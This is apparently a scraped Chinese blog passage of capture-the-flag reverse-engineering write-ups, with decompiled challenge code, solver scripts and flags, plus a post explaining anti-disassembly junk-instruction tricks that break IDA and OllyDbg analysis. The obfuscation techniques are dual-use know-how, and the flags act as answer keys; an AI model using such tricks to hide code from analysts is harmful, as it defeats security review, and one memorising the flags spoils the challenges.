85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60];if (ex.length == out.length) { j = 0; while(j &lt; ex.length){ if(ex[j] != out[j]) eq = false; j += 1; }if(eq){ alert('YOU WIN!');}else{ alert('NOPE!');}}else{alert('NOPE!');} 过程非常简单，也是闲着无聊，写了个什么都没有的网页 123456789101112&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;decode&lt;/title&gt; &lt;script type='text/javascript' src='out.js'&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;br/&gt; &lt;input type='button' onclick=\"run()\" value='decode'&gt;&lt;/button&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112function run() { const nonce = 'groke'; let j = 0; let flag =''; const ex = [1, 30, 14, 12, 69, 14, 1, 85, 75, 50, 40, 37, 48, 24, 10, 56, 55, 46, 56, 60]; let i = ex.length; while (j &lt; i) { flag+=String.fromCharCode(ex[j] ^ nonce.charCodeAt(j % 5)); j++; } alert(flag);} 点击按钮获得flag 1flag is: WOW_so_EASY windows_reverse2首先是脱壳，看雪脱壳工具就可以，也可以手动脱壳，IDA研究之后发现中间一个函数的作用不是很明朗，OD调试一下根据结果猜测可能是16进制转base64，试了一下就对了。 1ADEBDEAEC7BE Newbie_calculations这题的就是直接会输出flag，但是进行了大量费事而且毫无意义的计算，需要仔细分析一下每一部分的函数作用，简化计算的过程，总共只有三个运算函数，很简单，就不一一分析了，直接计算flag： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293#include&lt;iostream&gt;using namespace std;int* sub(int *a, int b) { *a -= b; return a;}int* add(int *a, int b) { *a += b; return a;}int* mul(int *a, int b) { *a *= b; return a;}int __cdecl main(int argc, const char **argv, const char **envp) { int *v3; // eax int *v4; // eax int *v5; // eax int *v6; // eax int *v7; // eax int *v8; // eax int *v9; // eax int *v10; // eax int *v11; // eax int *v12; // eax int *v13; // eax int *v14; // eax int *v15; // eax int *v16; // eax int *v17; // eax int *v18; // eax int *v19; // eax int *v20; // eax int *v21; // eax int *v22; // eax int *v23; // eax int *v24; // eax int *v25; // eax int *v26; // eax int *v27; // eax int *v28; // eax int *v29; // eax int *v30; // eax int *v31; // eax int *v32; // eax int *v33; // eax int *v34; // eax int *v35; // eax int *v36; // eax int *v37; // eax int *v38; // eax int *v39; // eax int *v40; // eax int *v41; // eax int *v42; // eax int *v43; // eax int *v44; // eax int *v45; // eax int *v46; // eax int *v47; // eax int *v48; // eax int *v49; // eax int *v50; // eax int *v51; // eax int *v52; // eax int *v53; // eax int *v54; // eax int *v55; // eax int *v56; // eax int *v57; // eax int *v58; // eax int *v59; // eax int *v60; // eax int *v61; // eax int *v62; // eax int *v63; // eax int *v64; // eax int *v65; // eax int *v66; // eax int *v67; // eax int *v68; // eax int *v69; // eax int *v70; // eax int *v71; // eax int *v72; // eax int *v73; // eax int *v74; // eax int *v75; // eax int *v76; // eax int *v77; // eax int *v78; // eax int *v79; // eax int *v80; // eax int *v81; // eax int *v82; // eax int *v83; // eax int *v84; // eax int *v85; // eax int *v86; // eax int *v87; // eax int *v88; // eax int *v89; // eax int *v90; // eax int *v91; // eax int *v92; // eax int *v93; // eax int *v94; // eax int *v95; // eax int *v96; // eax int *v97; // eax int *v98; // eax int *v99; // eax int *v100; // eax int *v101; // eax int *v102; // eax int *v103; // eax int *v104; // eax int *v105; // eax int *v106; // eax int *v107; // eax int *v108; // eax int v109; // ST1C_4 int *v110; // eax int *v111; // eax int v112; // ST20_4 int *v113; // eax int *v114; // eax int v115; // ST20_4 int *v116; // eax int flag[32]; // [esp+Ch] [ebp-88h] int v121; // [esp+8Ch] [ebp-8h] for (int i = 0; i &lt; 32; ++i ) flag[i] = 1; v121 = 0; puts(\"Your flag is:\"); v3 = mul(flag, 1000000000); v4 = sub(v3, 999999950); mul(v4, 2); v5 = add(&amp;flag[1], 5000000); v6 = sub(v5, 6666666); v7 = add(v6, 1666666); v8 = add(v7, 45); v9 = mul(v8, 2); add(v9, 5); v10 = mul(&amp;flag[2], 1000000000); v11 = sub(v10, 999999950); v12 = mul(v11, 2); add(v12, 2); v13 = add(&amp;flag[3], 55); v14 = sub(v13, 3); v15 = add(v14, 4); sub(v15, 1); v16 = mul(&amp;flag[4], 100000000); v17 = sub(v16, 99999950); v18 = mul(v17, 2); add(v18, 2); v19 = sub(&amp;flag[5], 1); v20 = mul(v19, 1000000000); v21 = add(v20, 55); sub(v21, 3); v22 = mul(&amp;flag[6], 1000000); v23 = sub(v22, 999975); mul(v23, 4); v24 = add(&amp;flag[7], 55); v25 = sub(v24, 33); v26 = add(v25, 44); sub(v26, 11); v27 = mul(&amp;flag[8], 10); v28 = sub(v27, 5); v29 = mul(v28, 8); add(v29, 9); v30 = add(&amp;flag[9], 0); v31 = sub(v30, 0); v32 = add(v31, 11); v33 = sub(v32, 11); add(v33, 53); v34 = add(&amp;flag[10], 49); v35 = sub(v34, 2); v36 = add(v35, 4); sub(v36, 2); v37 = mul(&amp;flag[11], 1000000); v38 = sub(v37, 999999); v39 = mul(v38, 4); add(v39, 50); v40 = add(&amp;flag[12], 1); v41 = add(v40, 1); v42 = add(v41, 1); v43 = add(v42, 1); v44 = add(v43, 1); v45 = add(v44, 1); v46 = add(v45, 10); add(v46, 32); v47 = mul(&amp;flag[13], 10); v48 = sub(v47, 5); v49 = mul(v48, 8); v50 = add(v49, 9); add(v50, 48); v51 = sub(&amp;flag[14], 1); v52 = mul(v51, -294967296); v53 = add(v52, 55); sub(v53, 3); v54 = add(&amp;flag[15], 1); v55 = add(v54, 2); v56 = add(v55, 3); v57 = add(v56, 4); v58 = add(v57, 5); v59 = add(v58, 6); v60 = add(v59, 7); add(v60, 20); v61 = mul(&amp;flag[16], 10); v62 = sub(v61, 5); v63 = mul(v62, 8); v64 = add(v63, 9); add(v64, 48); v65 = add(&amp;flag[17], 7); v66 = add(v65, 6); v67 = add(v66, 5); v68 = add(v67, 4); v69 = add(v68, 3); v70 = add(v69, 2); v71 = add(v70, 1); add(v71, 20); v72 = add(&amp;flag[18], 7); v73 = add(v72, 2); v74 = add(v73, 4); v75 = add(v74, 3); v76 = add(v75, 6); v77 = add(v76, 5); v78 = add(v77, 1); add(v78, 20); v79 = mul(&amp;flag[19], 1000000); v80 = sub(v79, 999999); v81 = mul(v80, 4); v82 = add(v81, 50); sub(v82, 1); v83 = sub(&amp;flag[20], 1); v84 = mul(v83, -294967296); v85 = add(v84, 49); sub(v85, 1); v86 = sub(&amp;flag[21], 1); v87 = mul(v86, 1000000000); v88 = add(v87, 54); v89 = sub(v88, 1); v90 = add(v89, 1000000000); sub(v90, 1000000000); v91 = add(&amp;flag[22], 49); v92 = sub(v91, 1); v93 = add(v92, 2); sub(v93, 1); v94 = mul(&amp;flag[23], 10); v95 = sub(v94, 5); v96 = mul(v95, 8); v97 = add(v96, 9); add(v97, 48); v98 = add(&amp;flag[24], 1); v99 = add(v98, 3); v100 = add(v99, 3); v101 = add(v100, 3); v102 = add(v101, 6); v103 = add(v102, 6); v104 = add(v103, 6); add(v104, 20); v105 = add(&amp;flag[25], 55); v106 = sub(v105, 33); v107 = add(v106, 44); v108 = sub(v107, 11); add(v108, 42); add(&amp;flag[26], flag[25]); add(&amp;flag[27], flag[12]); v109 = flag[27]; v110 = sub(&amp;flag[28], 1); v111 = add(v110, v109); sub(v111, 1); v112 = flag[23]; v113 = sub(&amp;flag[29], 1); v114 = mul(v113, 1000000); add(v114, v112); v115 = flag[27]; v116 = add(&amp;flag[30], 1); mul(v116, v115); add(&amp;flag[31], flag[30]); printf(\"CTF{\"); for (int j = 0; j &lt; 32; ++j) printf(\"%c\", char(flag[j])); puts(\"}\"); return 0;} 直接输出flag 12Your flag is:CTF{daf8f4d816261a41a115052a1bc21ade} easyre-153先查壳，发现是upx，脱壳 123456789101112131415161718192021222324252627282930313233int __cdecl main(int argc, const char **argv, const char **envp){ int pipedes[2]; // [esp+18h] [ebp-38h] __pid_t v5; // [esp+20h] [ebp-30h] int v6; // [esp+24h] [ebp-2Ch] char buf; // [esp+2Eh] [ebp-22h] unsigned int v8; // [esp+4Ch] [ebp-4h] v8 = __readgsdword(0x14u); pipe(pipedes); v5 = fork(); if ( !v5 ) { puts(\"\\nOMG!!!! I forgot kid's id\"); write(pipedes[1], \"69800876143568214356928753\", 29u); puts(\"Ready to exit \"); exit(0); } read(pipedes[0], &amp;buf, 29u); __isoc99_scanf(\"%d\", &amp;v6); if ( v6 == v5 ) { if ( (*(_DWORD *)((_BYTE *)lol + 3) &amp; 0xFF) == 204 ) { puts(\":D\"); exit(1); } printf(\"\\nYou got the key\\n \"); lol(&amp;buf); } wait(0); return 0;} 发现用到了简单的子进程和pipe。 pipe的作用就和名字一样，建立一个管道，这个管道一端是读，一端是写，按照规定，pipe[0]是读，pipe[1]是写，然后fork了一个子进程，在子进程中，返回值为0，进入if分支通过管道写入了一个字符串，然后退出子进程。在父进程中，返回的是fork出来的子进程的id，跳过if分支，在下面读取了刚刚子进程写入的字符串，关键就是lol这个函数 12345678910111213141516171819int __cdecl lol(_BYTE *a1){ char v2; // [esp+15h] [ebp-13h] char v3; // [esp+16h] [ebp-12h] char v4; // [esp+17h] [ebp-11h] char v5; // [esp+18h] [ebp-10h] char v6; // [esp+19h] [ebp-Fh] char v7; // [esp+1Ah] [ebp-Eh] char v8; // [esp+1Bh] [ebp-Dh] v2 = 2 * a1[1]; v3 = a1[4] + a1[5]; v4 = a1[8] + a1[9]; v5 = 2 * a1[12]; v6 = a1[18] + a1[17]; v7 = a1[10] + a1[21]; v8 = a1[9] + a1[25]; return printf(\"flag_is_not_here\");} 这里的处理过程非常简单，还是正向的处理，但是最后输出的是一个没用的字符串，所以即使是输入子进程的pid，也不会输出真正的flag，所以还是自己动手算出来 12345678910a1 = \"69800876143568214356928753\"v2 = 2 * ord(a1[1])v3 = ord(a1[4]) + ord(a1[5])v4 = ord(a1[8]) + ord(a1[9])v5 = 2 * ord(a1[12])v6 = ord(a1[18]) + ord(a1[17])v7 = ord(a1[10]) + ord(a1[21])v8 = ord(a1[9]) + ord(a1[25])print(chr(v2)+chr(v3)+chr(v4)+chr(v5)+chr(v6)+chr(v7)+chr(v8)) 输出结果 1rhelheg 直接提交不对，要套上外面的格式，试了一下比赛的名称，通过。 asong这题还是很考验对于算法的逆向能力的 首先IDA打开 1234567891011121314__int64 __fastcall main(__int64 a1, char **a2, char **a3){ void *that_girl; // ST00_8 const char *flag; // ST08_8 that_girl = malloc(0xBCuLL); flag = (const char *)malloc(80uLL); sub_400BBF(); read_0((__int64)flag); sub_400C02((__int64)flag); // 输入的是QCTF{***}的格式，在这里取出中间的部分 readfile(\"that_girl\", (__int64)that_girl); sub_400E54(flag, (__int64)that_girl); return 0LL;} 程序流程是这样，先输入flag，然后验证格式，取中间部分，然后读取另一个文件中的内容进行一些处理，然后将输入的flag和读取出来的内容进行一个比较，输出到out里面，重点来看一下几个函数 1234567891011121314151617int __fastcall readfile(const char *a1, __int64 a2){ int v2; // eax __int64 v4; // [rsp+0h] [rbp-20h] char buf; // [rsp+13h] [rbp-Dh] int fd; // [rsp+14h] [rbp-Ch] unsigned __int64 v7; // [rsp+18h] [rbp-8h] v7 = __readfsqword(0x28u); fd = open(a1, 0, a2, a1); while ( read(fd, &amp;buf, 1uLL) == 1 ) { v2 = sub_400936(buf); ++*(_DWORD *)(4LL * v2 + v4); } return close(fd);} 这里明显看到进行了一个词频统计，但是看这个伪代码完全看不出来处理之后的v4和分配出来的a2有什么关联，这点在C伪代码里面不是很明显，但是在汇编里面可以看的很清楚 12345678call sub_400936cdqelea rdx, ds:0[rax*4]mov rax, [rbp+var_20]add rax, rdxmov edx, [rax]add edx, 1mov [rax], edx 这里其实很清楚，sub_400936就是我们用来处理的函数，它的返回值放到了rax，cdqe的拓展在这里可以不用考虑，差不多算是个类型转换，ds:0是之前分配的空间，把ds:0[rax*4]的地址复制进rdx，后面的一句并没有什么意义，将这个地址中的值赋给rax，就是0，add之后rax的值就是我们需要的地址，接下来把该地址内存的的值取出来，加一然后再放回去，这个操作逻辑很容易理解。 这个函数过后构建了一个词频表，然后进行关键的变换。 12345678910111213141516unsigned __int64 __fastcall sub_400E54(const char *flag, __int64 that_girl){ int i; // [rsp+18h] [rbp-48h] int v4; // [rsp+1Ch] [rbp-44h] char v5[56]; // [rsp+20h] [rbp-40h] unsigned __int64 v6; // [rsp+58h] [rbp-8h] v6 = __readfsqword(0x28u); v4 = strlen(flag); for ( i = 0; i &lt; v4; ++i ) v5[i] = *(_DWORD *)(4LL * (signed int)sub_400936(flag[i]) + that_girl); sub_400D33((unsigned __int8 *)v5); sub_400DB4(v5, v4); writefile((__int64)v5, \"out\", v4); return __readfsqword(0x28u) ^ v6;} 首先就是一个换表，然后就是两个函数的操作之后输出到了out文件里面，这个是我们已知的，再去看看两个关键函数 12345678910111213141516__int64 __fastcall sub_400D33(unsigned __int8 *a1){ __int64 result; // rax _BYTE v2[5]; // [rsp+13h] [rbp-5h] v2[4] = 0; *(_DWORD *)v2 = *a1; while ( dword_6020A0[*(signed int *)&amp;v2[1]] ) { a1[*(signed int *)&amp;v2[1]] = a1[dword_6020A0[*(signed int *)&amp;v2[1]]]; *(_DWORD *)&amp;v2[1] = dword_6020A0[*(signed int *)&amp;v2[1]]; } result = v2[0]; a1[*(signed int *)&amp;v2[1]] = v2[0]; return result;} 这是一个简单的次序上的调整，可以很快的逆出来 12345678910111213_BYTE *__fastcall sub_400DB4(_BYTE *a1, int a2){ _BYTE *result; // rax char v3; // [rsp+17h] [rbp-5h] int i; // [rsp+18h] [rbp-4h] v3 = *a1 &gt;&gt; 5; for ( i = 0; a2 - 1 &gt; i; ++i ) a1[i] = 8 * a1[i] | (a1[i + 1] &gt;&gt; 5); result = &amp;a1[i]; *result = 8 * *result | v3; return result;} 这个函数里有些很有意思的操作，这个或操作看着很熟悉，这是显然是一个换位的操作，但是这里用了前一个数和后一个数之间的交错换位，逆起来就有了一些难度。 我也看过一些其他大佬的wp，这里普遍都是采用了爆破的方法，我不是很喜欢，虽然爆破可能更加省时省力，我还是想更加加深一下逆向位运算的熟练程度。 经过观察我们可以很轻松的发现，只需要将所有的数拆成两部分，再按照反方向运算回去就可以了，非常简单。 这样的话所有的内容就分析完了，这里我用python来做的逆向（后悔没有用C++） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293def sub_400936(a1): result = a1 - 10 if a1 == 10: result = a1 + 35 if a1 == 32 or a1 == 33 or a1 == 34: result = a1 + 10 if a1 == 39: result = a1 + 2 if a1 == 44: result = a1 - 4 if a1 == 46: result = a1 - 7 if a1 == 58 or a1 == 59: result = a1 - 21 if a1 == 63: result = a1 - 27 if a1 == 95: result = a1 - 49 if a1 &lt;= 47 or a1 &gt; 48: if a1 &lt;= 64 or a1 &gt; 90: if 96 &lt; a1 &lt;= 122: result = a1 - 87 else: result = a1 - 55 else: result = a1 - 48 return resultdef get_that_girl(): adic = {} fp = open(\"that_girl\", \"r\") while True: data = fp.read(1) if not data: break else: data = sub_400936(ord(data)) if data in adic: adic[data] = adic[data] + 1 else: adic[data] = 1 fp.close() return adicdef table(): t = {} for ia in range(256): t[sub_400936(ia)] = ia return ta1 = [0xec, 0x29, 0xe3, 0x41, 0xe1, 0xf7, 0xaa, 0x1d, 0x29, 0xed, 0x29, 0x99, 0x39, 0xf3, 0xb7, 0xa9, 0xe7, 0xac, 0x2b, 0xb7, 0xab, 0x40, 0x9f, 0xa9, 0x31, 0x35, 0x2c, 0x29, 0xef, 0xA8, 0x3d, 0x4b, 0xb0, 0xe9, 0xe1, 0x68, 0x7b, 0x41]target = []part1 = []part2 = []for i in range(len(a1)): part2.append((a1[i] &gt;&gt; 3) &amp; 0xff) part1.append((a1[i] &lt;&lt; 5) &amp; 0xff)target.append(part2[0] | part1[len(a1) - 1])for i in range(1, len(a1)): target.append(part2[i] | part1[i - 1])dword_6020A0 = [22, 0, 6, 2, 30, 24, 9, 1, 21, 7, 18, 10, 8, 12, 17, 23, 13, 4, 3, 14, 19, 11, 20, 16, 15, 5, 25, 36, 27, 28, 29, 37, 31, 32, 33, 26, 34, 35]i = 0index = []while (dword_6020A0[i]): index.append(i) i = dword_6020A0[i]index.append(1)index.reverse()a2 = [0 for i in range(len(index))]for i in index: if i == 1: a2[0] = target[i] a2[i] = target[dword_6020A0.index(i)]dic = get_that_girl()dic_ = {v: k for k, v in dic.items()}flag = 'QCTF{'for i in a2: flag += chr(table()[dic_[i]])flag += '}'print(flag) 最后一部分最开始是打算爆破，但是想到了一种更简便的方法，就是先把所有的ASCII码值遍历一遍，制作一个表，可以避免双重循环爆破，虽然实际上爆破也并不麻烦。 最后输出flag 1QCTF{that_girl_saying_no_for_your_vindicate} signin找一道比较简单的题目保持一下做题的感觉 用Ghidra打开，部分函数的签名有问题，有时候将RDX误当作函数的参数，但是函数只需要两个参数，这里我打开IDA看了一下，IDA做的要比Ghidra好很多，根据汇编修改了一下函数签名，看一下主要的函数部分。 1234567891011121314151617181920212223242526272829303132333435363738394041undefined8 FUN_00100a21(void){ int iVar1; long in_FS_OFFSET; undefined local_4a8 [16]; undefined local_498 [16]; undefined local_488 [16]; undefined local_478 [16]; undefined local_468 [112]; undefined local_3f8 [1000]; long local_10; local_10 = *(long *)(in_FS_OFFSET + 0x28); puts(\"[sign in]\"); printf(\"[input your flag]: \"); __isoc99_scanf(&amp;DAT_00100c26,local_468); /* 字符串转16进制 */ FUN_0010096a(local_468,local_3f8); __gmpz_init_set_str(local_478,\"ad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\", 0x10); __gmpz_init_set_str(local_488,local_3f8,0x10); __gmpz_init_set_str(local_4a8, \"103461035900816914121390101299049044413950405173712170434161686539878160984549\" ,10); __gmpz_init_set_str(local_498,\"65537\",10); __gmpz_powm(local_488,local_488,local_498,local_4a8); iVar1 = __gmpz_cmp(local_488,local_478); if (iVar1 == 0) { puts(\"TTTTTTTTTTql!\"); } else { puts(\"GG!\"); } if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0;} 首先是需要我们输入字符串，然后进行了一些大数的操作，这里是利用了一个库，查了一下mannual，很好理解，输入之后有一个函数对我们输入的字符串进行了一些操作，进入这个函数 1234567891011121314151617181920void FUN_0010096a(char *param_1,long param_2){ size_t sVar1; int local_20; int local_1c; local_20 = 0; local_1c = 0; while( true ) { sVar1 = strlen(param_1); if (sVar1 &lt;= (ulong)(long)local_20) break; *(undefined *)(local_1c + param_2) = (&amp;DAT_00302010)[(int)(param_1[local_20] &gt;&gt; 4)]; *(undefined *)((long)local_1c + 1 + param_2) = (&amp;DAT_00302010)[(int)((int)param_1[local_20] &amp; 0xf)]; local_20 = local_20 + 1; local_1c = local_1c + 2; } return;} 看到分别取低四位和高四位的操作之后立刻反应过来是把字符串转换为16进制串，耐心看一下很好理解。 回到主函数，看到乘幂取模操作，发现是RSA，用yafu分解一下103461035900816914121390101299049044413950405173712170434161686539878160984549 分解的也很快，这个数还是不够大 12prp39 = 282164587459512124844245113950593348271prp39 = 366669102002966856876605669837014229419 然后可以直接在线解密也是可以解出来的，由于gmpy2安装不上，直接在线解密了 1suctf{Pwn_@_hundred_years} key过程很复杂，动态调试绕过文件检测之后调试出flag 1idg_cni~bjbfi|gsxb notsequence题目还是很不错，逻辑很清楚，仔细观察可以看出来杨辉三角就解决了，一共20层，全部组合起来取md5就可以了 1234567891011121314151617181920import hashlibdef create(line): # 生成杨辉三角的一行 L = [1] for x in range(1, len(line)): L.append(line[x] + line[x - 1]) L.append(1) return LL = [1]raw_flag = '1'for x in range(19): L = create(L) raw_flag += ''.join([str(i) for i in L])# print(raw_flag)m = hashlib.md5(raw_flag.encode()).hexdigest()print('RCTF{' + m + '}') 输出flag 1RCTF{37894beff1c632010dd6d524aa9604db} zorropub没想到会用pwntools去爆破一道逆向题…… 感觉有些复杂，无脑爆破得到结果 catch-me这题用了sse算法，而且整个过程非常复杂，所以猜测了一下其中的两个数相同，然后得到了flag BabyXor首先脱壳，然后观察IDA，发现函数很多进行了很多次的异或运算，因此选择直接动态调试，调试到关键函数的最后发现几个运算是算出了flag的三个部分，拼接得到flag","link":"/2020/02/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-re%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3%EF%BC%88%E5%9B%9B%EF%BC%89/"},{"title":"花指令","text":"年轻人的第一个花指令 这里写一下有关花指令的内容，自己的理解也很有限，只能以后再多学学再补充，现在只能把自己知道的写下来。 原理首先反汇编有一个很关键的问题，就是怎么样区分数据和代码，由于x86和x64架构的每条指令是不等长的，区分数据和代码就变得很困难，反汇编的算法必须要对汇编指令长度和各种各样的跳转进行适当的处理，不然就会发生错误，导致反汇编失败，这也是花指令的作用。 目前主要的反汇编算法主要还是线性扫描*(Linear Sweep)和较高级的递归行进(Recursive Traversal)*，目前我比较常用的就是OD和IDA，它们的工作原理列在下面，此外还尝试了Ghidra，这个工具比较神奇，可以在有花指令的情况下抛掉很多无用的指令，反汇编出函数的大概，目前工作的原理还没有详细地了解，这里先提一下，了解之后再补充。 线性扫描本身的技术含量不是很高，反汇编工具将整个模块中的每一条指令都反汇编成汇编指令，每一个遇到的机器码都会当作汇编指令处理（不加判断），所以线性扫描根本不能把代码和数据区分开来，而一旦一条指令开始出错，整个反汇编都开始出错。 递归行进算法相较于线性扫描算法更灵活一些，它是按照代码可能的执行顺序来反汇编程序，每条可能的路径来扫描，解码出分支之后会记录这个地址，分别反汇编各个分支中的指令，这样按照路径进行搜寻，可以有效避免将数据识别成指令的问题。 工具 算法 OllyDbg Linear Sweep/Recursive Traversal(Ctrl+A) IDA Pro Recursive Traversal Ghidra 但是我们可以通过巧妙地构造代码和数据，插入一些“花指令”，以此干扰反汇编软件。因为前面提到的不同的机器指令包含的字节数不同地原因，所有的多字节指令只有正确识别第一个字节，也就是操作码，才能正确实现反汇编，否则就会识别成完全不同的另一条指令。 而迷惑递归行进算法还需要多动动脑子，一两个简单的垃圾数据不会使递归行进算法失效，但是，个人理解，在递归行进算法中，任意的控制转移指令，其后的地址都认为是有效的，因为递归行进算法中最重要的就是通过跳转来确定分支，因此，我们可以利用跳转来实现我们想要的“花指令”。 常见花指令 jx &amp; jnx 比如说这样一段代码 123456text:00401065 jz short near ptr loc_40107Ctext:00401067 jnz short near ptr loc_40107Ctext:00401069text:00401069 loc_401069:text:00401069 db 36h ;junk code heretext:0040107C …… ​ 这里只是一个随便编写的例子，但是差不多所有的处理都是这个样子，两个互补指令代替了一个强制跳转，但是在IDA这里，没有成功跳转的分支也是默认有效的，所以会去解析junk code，后面的指令也就跟着出错了。 call+pop/(add esp)+return 比如说这样的代码 1234567text:0040103B call loc_401042 text:0040103B sub_401022 endp;sp-analysis failed text:0040103B text:00401040 cmp cl,dl text:00401042 text:00401042 loc_401042: text:00401042 add esp,4 call指令相当于jmp+push eip，所以用add esp,4指令可以消除入栈的eip的影响，此时call就相当于jmp，但是IDA还是会把0x401042当作新函数的首地址，所以当前函数的识别就会出错，IDA会找不到结束位置，因此没法继续反汇编。 jx 这一类理解起来也蛮简单的，就是jmp到一个IDA无法解析的位置，比如说下面这段 123456789.text:00000000004009F5 loc_4009F5: .text:00000000004009F5 jmp short near ptr loc_4009FB+1;---------------------------------------------------------------------------;从这里开始.text:00000000004009F7 xor eax, eax.text:00000000004009F9 jz short loc_4009F5.text:00000000004009FB.text:00000000004009FB loc_4009FB: .text:00000000004009FB call near ptr 0C59748h 最下面这个0c59748的地址显然是无效的，这里肯定是出了问题，仔细观察一下代码，xor eax, eax这句得到的是0，所以下一个跳转是一定可以实现的，但是IDA判断不出来，他会对所有可能的分支进行解析，所以会从0x4009FB出开始解析新的命令，然后这个跳转并不存在，就会提示地址不存在，但是真正让反汇编进行不下去的是接下来的操作，另一条可能的路径，即正常的执行流程，进入到0x4009F5之后跳转到了0x4009FC的位置，但是这里已经解析过了，被一条假的命令占用了，IDA就会停止反汇编，然后报错。 call+一些巧妙的处理 最近比赛的时候见到了一个很不错的花指令，可以学习一下，在call指令之后写入一些junk code，然后在调用的函数中对返回地址进行处理跳过junk code，详细的过程在这里 后记写花指令的方式实在太多，也有很多很有创意的花指令，记录是记录不完的，但是只要掌握的原理，跟着程序的流程走，都不会有太大的难度，熟练了以后可以尝试使用脚本去除花指令。","link":"/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/"},{"title":"高校战疫-两道re-wp","text":"这两天攻防世界有个比赛，上面的题目还不错，参与了一下，至于为什么是两道re，因为正好赶上数模美赛，没怎么有时间做（实际上就是因为菜 cyclegraph1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465void FUN_00401080(void){ char cVar1; char *pcVar2; undefined4 *puVar3; undefined1 unaff_DI; int iVar4; char local_20 [4]; char local_1c; char acStack27 [16]; char local_b; uint local_8; local_8 = DAT_00403004 ^ (uint)&amp;stack0xfffffffc; DAT_00403370 = 0; puVar3 = &amp;DAT_00403384; DAT_00403374 = '0'; DAT_00403378 = &amp;DAT_00403380; iVar4 = 0; do { puVar3[-1] = *(undefined4 *)((int)null_ARRAY_00402178 + iVar4); *(undefined4 **)puVar3 = &amp;DAT_00403380 + *(int *)((int)null_ARRAY_00402278 + iVar4) * 3; *(undefined4 **)(puVar3 + 1) = &amp;DAT_00403380 + *(int *)((int)null_ARRAY_004021f8 + iVar4) * 3; puVar3 = puVar3 + 3; iVar4 = iVar4 + 4; } while ((int)puVar3 &lt; 0x403504); print(\"You need a flag to get out of this:\\n\",unaff_DI); scan(&amp;DAT_0040214c,0xe0); iVar4 = 5; do { cVar1 = local_20[iVar4]; if (*DAT_00403378 + (int)DAT_00403374 == (int)cVar1) { DAT_00403378 = (int *)DAT_00403378[1]; } else { if ((int)DAT_00403374 - *DAT_00403378 != (int)cVar1) { print(\"This is not flag~\\n\",unaff_DI); system(\"pause\"); /* WARNING: Subroutine does not return */ exit(1); } DAT_00403378 = (int *)DAT_00403378[2]; } DAT_00403374 = local_20[iVar4]; DAT_00403370 = DAT_00403370 + 1; iVar4 = iVar4 + 1; } while (iVar4 &lt; 0x15); if (((((local_20[0] == 'f') &amp;&amp; (local_20[1] == 'l')) &amp;&amp; (local_20[2] == 'a')) &amp;&amp; ((local_20[3] == 'g' &amp;&amp; (local_1c == '{')))) &amp;&amp; (local_b == '}')) { if ((DAT_00403370 &lt; 0x11) &amp;&amp; (DAT_00403378 == (int *)&amp;DAT_004034f4)) { pcVar2 = \"Congratulations!!\\n\"; } else { pcVar2 = \"This is not flag~\\n\"; } } else { pcVar2 = \"illegal input~\\n\"; } print(pcVar2,cVar1); system(\"pause\"); FUN_004011f4(); return;} 表面上看起来很复杂，仔细研究就会发现，开始的循环是在构造一个有向图，用到了一个结构体，而后面的部分是一个寻路的过程，正向的过程是根据输入的flag的值进行移动，最终走到最后一个位置，所以逆向的过程就是先寻找路径，然后通过找到的路径来计算flag的值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113#include &lt;iostream&gt;using namespace std;struct a { int val; a *loc1; a *loc2;};bool dfs(a *ss, a *ee, int n, a *s[]) { if (n == 0) { return ss == ee; } if (dfs(ss-&gt;loc1, ee, n - 1, s)) { for (int i = 0; i &lt; 0x11; i++) { if (s[i] == nullptr) { s[i] = ss-&gt;loc1; break; } } return true; } else { if (dfs(ss-&gt;loc2, ee, n - 1, s)) { for (int i = 0; i &lt; 0x11; i++) { if (s[i] == nullptr) { s[i] = ss-&gt;loc2; break; } } return true; } }}void fun() { int dword_402178[] = { 52, 2, 44, 42, 6, 42, 47, 42, 51, 3, 2, 50, 50, 50, 48, 3, 1, 50, 43, 2, 46, 1, 2, 45, 50, 4, 45, 48, 49, 47, 51, 5 }; int dword_4021F8[] = { 1, 8, 7, 23, 9, 19, 31, 23, 9, 13, 12, 29, 10, 24, 9, 24, 25, 9, 26, 3, 22, 6, 17, 13, 7, 15, 20, 1, 16, 4, 11, 31 }; int dword_402278[] = { 2, 2, 1, 18, 7, 2, 26, 13, 4, 10, 4, 21, 14, 1, 0, 14, 5, 7, 28, 12, 28, 15, 15, 2, 16, 23, 30, 23, 19, 9, 22, 31 }; a puVar3[32]; a *DAT_00403378 = puVar3; a *s[0x12]= {nullptr}; int i = 0; do { puVar3[i].val = dword_402178[i]; puVar3[i].loc1 = &amp;puVar3[dword_402278[i]]; puVar3[i].loc2 = &amp;puVar3[dword_4021F8[i]]; i++; } while (i &lt; 32); dfs(DAT_00403378, &amp;puVar3[31], 0x10, s); DAT_00403378 = puVar3; string flag; int DAT_00403374 = 48; char tmp; for(int j=0; j &lt; 0x10; j++) { if(s[0xf-j]==DAT_00403378-&gt;loc1) { tmp=DAT_00403378-&gt;val + DAT_00403374; DAT_00403378=DAT_00403378-&gt;loc1; } else{ tmp=DAT_00403374 - DAT_00403378-&gt;val; DAT_00403378=DAT_00403378-&gt;loc2; } flag+=tmp; DAT_00403374 = tmp; } 